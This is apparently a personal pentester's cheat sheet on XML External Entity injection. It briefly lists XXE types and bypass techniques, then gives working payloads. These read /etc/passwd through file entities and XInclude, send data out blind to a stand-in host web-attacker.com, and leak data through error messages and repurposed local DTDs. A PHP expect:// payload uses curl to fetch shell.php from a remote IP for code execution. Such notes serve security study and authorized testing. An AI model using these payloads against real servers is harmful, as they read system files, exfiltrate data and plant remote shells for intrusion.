# XXE Injection
	XXE : XML External Entity

XXE is the use of xml requests to perform arbitiray requests

###### XXE types : 
- XXE to retrive files 
- XXE to Perform SSRF
- Blind XXE to exfiltrate data
- **XXE To RCE**

###### techniques:
- remove `<?xml>` from the payload
- combian between payloads to bypass some xml hardening 
- some xxe are not present in the request but can by exploited via using `Xinclude`  to edit part of the xml file 
- XXE via upload file, details on payloadAllThings
- [XXE attacks via modified content type](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files:~:text=XXE%20attacks%20via%20modified%20content%20type)
- XXE by editing local dtd file, files always existing, [resource](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
```
file:///usr/share/yelp/dtd/docbookx.dtd
file:///C:\Windows\System32\wbem\xml\cim20.dtd
```


payloads:
- [payloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)
- php filter
```php
# base64 encode
php://filter/convert.base64-encode/resource=
```
- __XXE via normal entity__ [DETECTION]
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
<tag>&ext;</tag>
```
- __BLIND XXE via XML parameter entity__ [DETECTION]
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; %xxe;/]>
```
- __BLIND XXE__ [EXIF]
+ external dtd file:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;
```
- XXE simple payload:
	```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
- __BLIND XXE via error message__ [EXFIL]
	```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; %error;
```
- __BLIND XXE via repurposing a local DTD__ [EXFIL]
```xml
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"> <!ENTITY % custom_entity ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```
- __locate Local DTD file__ [ENUM]
	```xml
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
``` 
- __using Xinclude to retrive files when can't edit DOCTYPE__ 
	```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- XXE to RCE in php
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'10.10.14.2/shell.php'">
]>
<root>
<name>Joe</name>
<tel>ufgh</tel>
<email>START_&file;_END</email>
<password>kjh</password>
</root>
```